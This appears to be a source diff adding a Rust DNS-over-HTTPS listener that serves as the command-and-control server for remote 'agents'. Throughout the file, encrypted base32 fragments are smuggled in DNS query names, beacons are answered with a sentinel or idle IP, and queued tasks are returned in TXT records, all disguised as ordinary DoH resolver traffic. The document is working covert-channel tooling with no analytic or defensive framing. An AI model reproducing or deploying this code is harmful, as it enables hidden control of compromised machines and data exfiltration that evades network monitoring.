@@ -1,0 +1,800 @@
+//! DNS-over-HTTPS listener bridging DoH queries to Orchestra agent sessions.
+
+use crate::state::{now_secs, AgentEntry, AppState};
+use anyhow::{anyhow, Result};
+use axum::{
+    body::Bytes,
+    extract::{Query, State},
+    http::{header, HeaderValue, StatusCode},
+    response::IntoResponse,
+    routing::get,
+    Json, Router,
+};
+use common::{CryptoSession, Message, PROTOCOL_VERSION};
+use dashmap::{
+    mapref::entry::Entry,
+    DashMap,
+};
+use serde::{Deserialize, Serialize};
+use std::{
+    collections::{BTreeMap, VecDeque},
+    net::{Ipv4Addr, SocketAddr},
+    sync::{Arc, Mutex},
+};
+use tokio::sync::mpsc;
+
+const TYPE_A: u16 = 1;
+const TYPE_TXT: u16 = 16;
+
+#[derive(Clone)]
+struct DohRuntime {
+    app: Arc<AppState>,
+    domain: String,
+    domain_labels: Vec<String>,
+    beacon_sentinel: Ipv4Addr,
+    idle_ip: Ipv4Addr,
+    crypto: Arc<CryptoSession>,
+    sessions: Arc<DashMap<String, Arc<Mutex<DohSession>>>>,
+}
+
+struct DohSession {
+    connection_id: String,
+    fragments: BTreeMap<u32, String>,
+    next_seq: Option<u32>,
+    outbound_rx: mpsc::Receiver<Message>,
+    outbound_queue: VecDeque<Message>,
+}
+
+impl DohRuntime {
+    fn new(
+        app: Arc<AppState>,
+        agent_secret: String,
+        domain: String,
+        beacon_sentinel: String,
+        idle_ip: String,
+    ) -> Result<Self> {
+        let domain = normalize_name(&domain);
+        if domain.is_empty() {
+            return Err(anyhow!("doh_domain cannot be empty"));
+        }
+
+        let beacon_sentinel = beacon_sentinel
+            .parse::<Ipv4Addr>()
+            .map_err(|e| anyhow!("invalid doh_beacon_sentinel: {e}"))?;
+        let idle_ip = idle_ip
+            .parse::<Ipv4Addr>()
+            .map_err(|e| anyhow!("invalid doh_idle_ip: {e}"))?;
+
+        Ok(Self {
+            app,
+            domain_labels: split_labels(&domain),
+            domain,
+            beacon_sentinel,
+            idle_ip,
+            crypto: Arc::new(CryptoSession::from_shared_secret(agent_secret.as_bytes())),
+            sessions: Arc::new(DashMap::new()),
+        })
+    }
+
+    fn get_or_create_session(&self, session_id: &str) -> Arc<Mutex<DohSession>> {
+        match self.sessions.entry(session_id.to_string()) {
+            Entry::Occupied(o) => o.get().clone(),
+            Entry::Vacant(v) => {
+                let connection_id = format!("doh-{session_id}");
+                let (tx, rx) = mpsc::channel::<Message>(64);
+
+                self.app.registry.insert(
+                    connection_id.clone(),
+                    AgentEntry {
+                        connection_id: connection_id.clone(),
+                        agent_id: format!("doh-{session_id}"),
+                        hostname: "doh".to_string(),
+                        last_seen: now_secs(),
+                        tx,
+                        peer: format!("doh/{session_id}"),
+                    },
+                );
+
+                let session = Arc::new(Mutex::new(DohSession {
+                    connection_id,
+                    fragments: BTreeMap::new(),
+                    next_seq: None,
+                    outbound_rx: rx,
+                    outbound_queue: VecDeque::new(),
+                }));
+                v.insert(session.clone());
+                session
+            }
+        }
+    }
+
+    fn drain_outbound_queue(sess: &mut DohSession) {
+        while let Ok(msg) = sess.outbound_rx.try_recv() {
+            sess.outbound_queue.push_back(msg);
+        }
+    }
+
+    fn parse_name(&self, name: &str) -> Option<ParsedName> {
+        let normalized = normalize_name(name);
+        let labels = split_labels(&normalized);
+        if labels.len() <= self.domain_labels.len() {
+            return None;
+        }
+        if !has_suffix(&labels, &self.domain_labels) {
+            return None;
+        }
+
+        let prefix = &labels[..labels.len() - self.domain_labels.len()];
+        match prefix {
+            [kind, session_id] if kind == "beacon" && is_hex(session_id) => {
+                Some(ParsedName::Beacon {
+                    session_id: session_id.clone(),
+                })
+            }
+            [kind, session_id] if kind == "task" && is_hex(session_id) => {
+                Some(ParsedName::Task {
+                    session_id: session_id.clone(),
+                })
+            }
+            [seq_s, chunk, session_id] if is_hex(session_id) => {
+                let seq = seq_s.parse::<u32>().ok()?;
+                Some(ParsedName::Fragment {
+                    session_id: session_id.clone(),
+                    seq,
+                    chunk: chunk.clone(),
+                })
+            }
+            _ => None,
+        }
+    }
+
+    fn resolve_query(&self, name: &str, qtype: u16) -> ResolveResult {
+        let parsed = match self.parse_name(name) {
+            Some(p) => p,
+            None => {
+                return ResolveResult {
+                    rcode: 3,
+                    answers: Vec::new(),
+                };
+            }
+        };
+
+        match parsed {
+            ParsedName::Fragment {
+                session_id,
+                seq,
+                chunk,
+            } => {
+                if qtype == TYPE_TXT {
+                    self.handle_fragment(&session_id, seq, &chunk);
+                }
+                ResolveResult {
+                    rcode: 0,
+                    answers: Vec::new(),
+                }
+            }
+            ParsedName::Beacon { session_id } => {
+                if qtype != TYPE_A {
+                    return ResolveResult {
+                        rcode: 0,
+                        answers: Vec::new(),
+                    };
+                }
+                let has_pending = self.session_has_pending_tasking(&session_id);
+                let ip = if has_pending {
+                    self.beacon_sentinel
+                } else {
+                    self.idle_ip
+                };
+                ResolveResult {
+                    rcode: 0,
+                    answers: vec![Answer::A(ip)],
+                }
+            }
+            ParsedName::Task { session_id } => {
+                if qtype != TYPE_TXT {
+                    return ResolveResult {
+                        rcode: 0,
+                        answers: Vec::new(),
+                    };
+                }
+                ResolveResult {
+                    rcode: 0,
+                    answers: self.pop_tasking_answers(&session_id),
+                }
+            }
+        }
+    }
+
+    fn session_has_pending_tasking(&self, session_id: &str) -> bool {
+        let session = self.get_or_create_session(session_id);
+        let mut guard = match session.lock() {
+            Ok(g) => g,
+            Err(poisoned) => poisoned.into_inner(),
+        };
+        Self::drain_outbound_queue(&mut guard);
+        !guard.outbound_queue.is_empty()
+    }
+
+    fn pop_tasking_answers(&self, session_id: &str) -> Vec<Answer> {
+        let session = self.get_or_create_session(session_id);
+        let maybe_msg = {
+            let mut guard = match session.lock() {
+                Ok(g) => g,
+                Err(poisoned) => poisoned.into_inner(),
+            };
+            Self::drain_outbound_queue(&mut guard);
+            guard.outbound_queue.pop_front()
+        };
+
+        let Some(msg) = maybe_msg else {
+            return Vec::new();
+        };
+
+        let plain = match bincode::serialize(&msg) {
+            Ok(v) => v,
+            Err(e) => {
+                tracing::warn!("failed to serialize pending DoH task: {e}");
+                return Vec::new();
+            }
+        };
+
+        let ciphertext = self.crypto.encrypt(&plain);
+        let b32 = b32_encode(&ciphertext).to_ascii_lowercase();
+        if b32.is_empty() {
+            return Vec::new();
+        }
+
+        b32.as_bytes()
+            .chunks(255)
+            .map(|c| Answer::Txt(String::from_utf8_lossy(c).to_string()))
+            .collect()
+    }
+
+    fn handle_fragment(&self, session_id: &str, seq: u32, chunk: &str) {
+        let session = self.get_or_create_session(session_id);
+        let msgs = {
+            let mut guard = match session.lock() {
+                Ok(g) => g,
+                Err(poisoned) => poisoned.into_inner(),
+            };
+            guard.fragments.insert(seq, chunk.to_string());
+            if guard.next_seq.is_none() {
+                guard.next_seq = Some(seq);
+            }
+            try_reassemble_messages(&mut guard, &self.crypto)
+        };
+
+        for msg in msgs {
+            self.handle_agent_message(session_id, msg);
+        }
+    }
+
+    fn handle_agent_message(&self, session_id: &str, msg: Message) {
+        let connection_id = format!("doh-{session_id}");
+
+        match msg {
+            Message::VersionHandshake { version } => {
+                if version != PROTOCOL_VERSION {
+                    tracing::warn!(
+                        session_id = %session_id,
+                        agent_version = version,
+                        server_version = PROTOCOL_VERSION,
+                        "DoH agent/server protocol version mismatch"
+                    );
+                }
+                self.enqueue_outbound(
+                    session_id,
+                    Message::VersionHandshake {
+                        version: PROTOCOL_VERSION,
+                    },
+                );
+            }
+            Message::Heartbeat {
+                agent_id,
+                status,
+                timestamp: _,
+            } => {
+                if self
+                    .app
+                    .registry
+                    .iter()
+                    .any(|e| e.value().agent_id == agent_id && e.key() != &connection_id)
+                {
+                    tracing::warn!(
+                        agent_id = %agent_id,
+                        connection_id = %connection_id,
+                        "duplicate agent_id reported on DoH session"
+                    );
+                }
+
+                if let Some(mut entry) = self.app.registry.get_mut(&connection_id) {
+                    entry.agent_id = agent_id;
+                    entry.hostname = status;
+                    entry.last_seen = now_secs();
+                }
+            }
+            Message::TaskResponse { task_id, result } => {
+                if let Some((_, sender)) = self.app.pending.remove(&task_id) {
+                    let _ = sender.send(result);
+                }
+            }
+            Message::AuditLog(ev) => {
+                self.app.audit.record(ev);
+            }
+            _ => {
+                tracing::debug!(
+                    session_id = %session_id,
+                    "ignoring DoH agent->server message variant"
+                );
+            }
+        }
+    }
+
+    fn enqueue_outbound(&self, session_id: &str, msg: Message) {
+        let session = self.get_or_create_session(session_id);
+        let mut guard = match session.lock() {
+            Ok(g) => g,
+            Err(poisoned) => poisoned.into_inner(),
+        };
+        guard.outbound_queue.push_back(msg);
+        if let Some(mut entry) = self.app.registry.get_mut(&guard.connection_id) {
+            entry.last_seen = now_secs();
+        }
+    }
+}
+
+fn try_reassemble_messages(sess: &mut DohSession, crypto: &CryptoSession) -> Vec<Message> {
+    let mut out = Vec::new();
+
+    loop {
+        let start = match sess.next_seq {
+            Some(v) => v,
+            None => match sess.fragments.keys().next().copied() {
+                Some(v) => {
+                    sess.next_seq = Some(v);
+                    v
+                }
+                None => break,
+            },
+        };
+
+        if !sess.fragments.contains_key(&start) {
+            break;
+        }
+
+        let mut assembled = String::new();
+        let mut seq = start;
+        let mut resolved: Option<(u32, Message)> = None;
+
+        loop {
+            let chunk = match sess.fragments.get(&seq) {
+                Some(c) => c.clone(),
+                None => break,
+            };
+            assembled.push_str(&chunk);
+
+            if let Some(ciphertext) = b32_decode(&assembled) {
+                if let Ok(plain) = crypto.decrypt(&ciphertext) {
+                    if let Ok(msg) = bincode::deserialize::<Message>(&plain) {
+                        resolved = Some((seq, msg));
+                        break;
+                    }
+                }
+            }
+
+            let next = seq.wrapping_add(1);
+            if next == start {
+                break;
+            }
+            seq = next;
+        }
+
+        let Some((end_seq, msg)) = resolved else {
+            break;
+        };
+
+        let mut cur = start;
+        loop {
+            sess.fragments.remove(&cur);
+            if cur == end_seq {
+                break;
+            }
+            cur = cur.wrapping_add(1);
+        }
+        sess.next_seq = Some(end_seq.wrapping_add(1));
+        out.push(msg);
+    }
+
+    out
+}
+
+#[derive(Debug, Clone)]
+enum ParsedName {
+    Fragment {
+        session_id: String,
+        seq: u32,
+        chunk: String,
+    },
+    Beacon {
+        session_id: String,
+    },
+    Task {
+        session_id: String,
+    },
+}
+
+#[derive(Debug, Clone)]
+enum Answer {
+    A(Ipv4Addr),
+    Txt(String),
+}
+
+struct ResolveResult {
+    rcode: u8,
+    answers: Vec<Answer>,
+}
+
+#[derive(Deserialize)]
+struct DnsGetQuery {
+    name: String,
+    #[serde(rename = "type")]
+    qtype: String,
+}
+
+#[derive(Serialize)]
+struct DnsJsonQuestion {
+    name: String,
+    #[serde(rename = "type")]
+    qtype: u16,
+}
+
+#[derive(Serialize)]
+struct DnsJsonAnswer {
+    name: String,
+    #[serde(rename = "type")]
+    qtype: u16,
+    #[serde(rename = "TTL")]
+    ttl: u32,
+    data: String,
+}
+
+#[derive(Serialize)]
+struct DnsJsonResponse {
+    #[serde(rename = "Status")]
+    status: u8,
+    #[serde(rename = "TC")]
+    tc: bool,
+    #[serde(rename = "RD")]
+    rd: bool,
+    #[serde(rename = "RA")]
+    ra: bool,
+    #[serde(rename = "AD")]
+    ad: bool,
+    #[serde(rename = "CD")]
+    cd: bool,
+    #[serde(rename = "Question")]
+    question: Vec<DnsJsonQuestion>,
+    #[serde(rename = "Answer")]
+    answer: Vec<DnsJsonAnswer>,
+}
+
+fn router(state: Arc<DohRuntime>) -> Router {
+    Router::new()
+        .route("/dns-query", get(handle_get).post(handle_post))
+        .with_state(state)
+}
+
+pub async fn run(
+    app: Arc<AppState>,
+    listen_addr: SocketAddr,
+    agent_secret: String,
+    doh_domain: String,
+    doh_beacon_sentinel: String,
+    doh_idle_ip: String,
+) -> Result<()> {
+    let state = Arc::new(DohRuntime::new(
+        app,
+        agent_secret,
+        doh_domain,
+        doh_beacon_sentinel,
+        doh_idle_ip,
+    )?);
+
+    tracing::info!(
+        addr = %listen_addr,
+        domain = %state.domain,
+        "DoH listener bound"
+    );
+
+    let listener = tokio::net::TcpListener::bind(listen_addr).await?;
+    axum::serve(listener, router(state).into_make_service()).await?;
+    Ok(())
+}
+
+async fn handle_get(
+    State(state): State<Arc<DohRuntime>>,
+    Query(query): Query<DnsGetQuery>,
+) -> impl IntoResponse {
+    let qtype = match parse_qtype(&query.qtype) {
+        Some(t) => t,
+        None => return (StatusCode::BAD_REQUEST, "unsupported query type").into_response(),
+    };
+
+    let resolved = state.resolve_query(&query.name, qtype);
+    let answer = resolved
+        .answers
+        .iter()
+        .map(|a| match a {
+            Answer::A(ip) => DnsJsonAnswer {
+                name: query.name.clone(),
+                qtype: TYPE_A,
+                ttl: 30,
+                data: ip.to_string(),
+            },
+            Answer::Txt(txt) => DnsJsonAnswer {
+                name: query.name.clone(),
+                qtype: TYPE_TXT,
+                ttl: 1,
+                data: format!("\"{}\"", txt),
+            },
+        })
+        .collect::<Vec<_>>();
+
+    let payload = DnsJsonResponse {
+        status: resolved.rcode,
+        tc: false,
+        rd: true,
+        ra: true,
+        ad: false,
+        cd: false,
+        question: vec![DnsJsonQuestion {
+            name: query.name,
+            qtype,
+        }],
+        answer,
+    };
+
+    (
+        [(
+            header::CONTENT_TYPE,
+            HeaderValue::from_static("application/dns-json"),
+        )],
+        Json(payload),
+    )
+        .into_response()
+}
+
+async fn handle_post(State(state): State<Arc<DohRuntime>>, body: Bytes) -> impl IntoResponse {
+    let query = match parse_dns_wire_query(&body) {
+        Ok(q) => q,
+        Err(e) => {
+            tracing::debug!("invalid DoH dns-message query: {e}");
+            return (StatusCode::BAD_REQUEST, "invalid dns-message payload").into_response();
+        }
+    };
+
+    let resolved = state.resolve_query(&query.qname, query.qtype);
+    let packet = build_dns_wire_response(&query, &resolved);
+
+    (
+        [(
+            header::CONTENT_TYPE,
+            HeaderValue::from_static("application/dns-message"),
+        )],
+        packet,
+    )
+        .into_response()
+}
+
+struct WireQuestion {
+    id: u16,
+    qname: String,
+    qtype: u16,
+    qclass: u16,
+    raw_question: Vec<u8>,
+}
+
+fn parse_dns_wire_query(packet: &[u8]) -> Result<WireQuestion> {
+    if packet.len() < 12 {
+        return Err(anyhow!("dns packet too short"));
+    }
+
+    let id = u16::from_be_bytes([packet[0], packet[1]]);
+    let qdcount = u16::from_be_bytes([packet[4], packet[5]]);
+    if qdcount == 0 {
+        return Err(anyhow!("dns query contains no questions"));
+    }
+
+    let mut idx = 12usize;
+    let qstart = idx;
+    let mut labels = Vec::new();
+
+    loop {
+        if idx >= packet.len() {
+            return Err(anyhow!("truncated qname"));
+        }
+        let len = packet[idx] as usize;
+        idx += 1;
+        if len == 0 {
+            break;
+        }
+        if (len & 0xC0) != 0 {
+            return Err(anyhow!("compressed qname pointers are not supported"));
+        }
+        if idx + len > packet.len() {
+            return Err(anyhow!("truncated qname label"));
+        }
+        let label = std::str::from_utf8(&packet[idx..idx + len])?
+            .to_ascii_lowercase();
+        labels.push(label);
+        idx += len;
+    }
+
+    if idx + 4 > packet.len() {
+        return Err(anyhow!("truncated dns question"));
+    }
+
+    let qtype = u16::from_be_bytes([packet[idx], packet[idx + 1]]);
+    let qclass = u16::from_be_bytes([packet[idx + 2], packet[idx + 3]]);
+    idx += 4;
+
+    Ok(WireQuestion {
+        id,
+        qname: labels.join("."),
+        qtype,
+        qclass,
+        raw_question: packet[qstart..idx].to_vec(),
+    })
+}
+
+fn build_dns_wire_response(query: &WireQuestion, resolved: &ResolveResult) -> Vec<u8> {
+    let mut out = Vec::with_capacity(512);
+
+    let flags = 0x8180u16 | (resolved.rcode as u16);
+    out.extend_from_slice(&query.id.to_be_bytes());
+    out.extend_from_slice(&flags.to_be_bytes());
+    out.extend_from_slice(&(1u16).to_be_bytes());
+    out.extend_from_slice(&(resolved.answers.len() as u16).to_be_bytes());
+    out.extend_from_slice(&0u16.to_be_bytes());
+    out.extend_from_slice(&0u16.to_be_bytes());
+
+    out.extend_from_slice(&query.raw_question);
+
+    for answer in &resolved.answers {
+        // Name compression pointer to offset 12 (start of first qname).
+        out.extend_from_slice(&[0xC0, 0x0C]);
+
+        match answer {
+            Answer::A(ip) => {
+                out.extend_from_slice(&TYPE_A.to_be_bytes());
+                out.extend_from_slice(&query.qclass.to_be_bytes());
+                out.extend_from_slice(&30u32.to_be_bytes());
+                out.extend_from_slice(&4u16.to_be_bytes());
+                out.extend_from_slice(&ip.octets());
+            }
+            Answer::Txt(txt) => {
+                let bytes = txt.as_bytes();
+                let txt_len = bytes.len().min(255) as u8;
+                out.extend_from_slice(&TYPE_TXT.to_be_bytes());
+                out.extend_from_slice(&query.qclass.to_be_bytes());
+                out.extend_from_slice(&1u32.to_be_bytes());
+                out.extend_from_slice(&(u16::from(txt_len) + 1).to_be_bytes());
+                out.push(txt_len);
+                out.extend_from_slice(&bytes[..txt_len as usize]);
+            }
+        }
+    }
+
+    out
+}
+
+fn parse_qtype(s: &str) -> Option<u16> {
+    let s = s.trim();
+    if s.eq_ignore_ascii_case("a") {
+        Some(TYPE_A)
+    } else if s.eq_ignore_ascii_case("txt") {
+        Some(TYPE_TXT)
+    } else {
+        s.parse::<u16>().ok()
+    }
+}
+
+fn normalize_name(name: &str) -> String {
+    name.trim().trim_end_matches('.').to_ascii_lowercase()
+}
+
+fn split_labels(name: &str) -> Vec<String> {
+    name.split('.')
+        .filter(|p| !p.is_empty())
+        .map(|p| p.to_ascii_lowercase())
+        .collect()
+}
+
+fn has_suffix(labels: &[String], suffix: &[String]) -> bool {
+    if labels.len() < suffix.len() {
+        return false;
+    }
+    let start = labels.len() - suffix.len();
+    labels[start..]
+        .iter()
+        .zip(suffix.iter())
+        .all(|(a, b)| a == b)
+}
+
+fn is_hex(s: &str) -> bool {
+    !s.is_empty() && s.chars().all(|c| c.is_ascii_hexdigit())
+}
+
+const B32_ALPHABET: &[u8; 32] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";
+
+fn b32_encode(data: &[u8]) -> String {
+    if data.is_empty() {
+        return String::new();
+    }
+
+    let mut out = String::new();
+    let mut buffer: u32 = 0;
+    let mut bits = 0u8;
+
+    for &b in data {
+        buffer = (buffer << 8) | (b as u32);
+        bits += 8;
+        while bits >= 5 {
+            let shift = bits - 5;
+            let idx = ((buffer >> shift) & 0x1f) as usize;
+            out.push(B32_ALPHABET[idx] as char);
+            bits -= 5;
+            if bits > 0 {
+                buffer &= (1u32 << bits) - 1;
+            } else {
+                buffer = 0;
+            }
+        }
+    }
+
+    if bits > 0 {
+        let idx = ((buffer << (5 - bits)) & 0x1f) as usize;
+        out.push(B32_ALPHABET[idx] as char);
+    }
+
+    out
+}
+
+fn b32_decode(input: &str) -> Option<Vec<u8>> {
+    if input.is_empty() {
+        return Some(Vec::new());
+    }
+
+    let mut out = Vec::new();
+    let mut buffer: u32 = 0;
+    let mut bits: u8 = 0;
+
+    for &b in input.as_bytes() {
+        if b == b'=' {
+            continue;
+        }
+        let v = match b {
+            b'A'..=b'Z' => b - b'A',
+            b'a'..=b'z' => b - b'a',
+            b'2'..=b'7' => b - b'2' + 26,
+            _ => return None,
+        } as u32;
+
+        buffer = (buffer << 5) | v;
+        bits += 5;
+
+        while bits >= 8 {
+            let shift = bits - 8;
+            out.push(((buffer >> shift) & 0xff) as u8);
+            bits -= 8;
+            if bits > 0 {
+                buffer &= (1u32 << bits) - 1;
+            } else {
+                buffer = 0;
+            }
+        }
+    }
+
+    Some(out)
+}
